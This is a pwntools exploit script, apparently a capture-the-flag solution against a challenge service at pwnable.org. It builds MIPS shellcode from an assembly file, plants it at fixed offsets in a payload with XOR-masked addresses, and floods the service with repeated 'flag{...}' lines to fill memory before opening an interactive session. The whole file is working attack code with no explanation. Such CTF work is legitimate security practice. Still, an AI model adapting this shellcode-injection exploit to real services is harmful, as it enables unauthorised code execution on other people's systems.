#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.endian='big'
#context.log_level="debug"
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
#r = remote("127.0.0.1",9999)
r = remote("pwnable.org",21387)
#r=process("./run.sh")
r.recvuntil("Give me flag: ")
os.system("mips-linux-gnu-gcc mips_code.S -c -fPIC -o /tmp/a.o")
os.system("mips-linux-gnu-ld /tmp/a.o -o /tmp/sc")
os.system("mips-linux-gnu-objcopy -S -O binary -j .text /tmp/sc /tmp/sc.bin")
with open("/tmp/sc.bin","rb") as f:
    mips_code = f.read()

f = {
    0x500-4:mips_code,
    0x600:p32(0x80000814 ^ 0xd3abc0de) + p32(0x80008500 ^ 0xd3abc0de),
    0x7bc:p32(0x8604)#
}

payload = fit(f,filler=b"\xcc")
for i in range(0x8000//len(payload)):
    #print("round %d"%i)
    #r.recvuntil("Give me flag: ")
    r.sendline(b"flag{%s}"%(payload))

left = 0x8000%len(payload)
r.sendline(b"flag{%s}"%(b"a"*(left-5)))
r.sendline(b"flag{}")
r.interactive()
